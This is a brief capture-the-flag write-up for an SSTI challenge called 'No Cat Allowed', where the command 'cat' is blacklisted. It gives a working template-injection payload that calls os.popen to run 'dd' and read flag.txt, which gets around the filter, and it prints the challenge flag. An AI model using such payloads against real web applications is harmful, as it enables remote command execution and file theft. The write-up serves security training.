# No Cat Allowed

Author: k.eii

## Description

No Cat Allowed in Here

## Requirements

None

## Sources

-

## Tags

SSTI, Blacklist

## Exploit

- SSTI reguler
- Blacklisted on cat, etc.
use: dd if=flag.txt bs=1
``` {{ namespace.__init__.__globals__.os.popen('dd if=flag.txt bs=1').read() }} ```

## Flag

```
WRECKIT50{SSTI_w0nt_all0w_cat_1n_th1s_pl4ce}
```
## connection



## Severity
MEDIUM
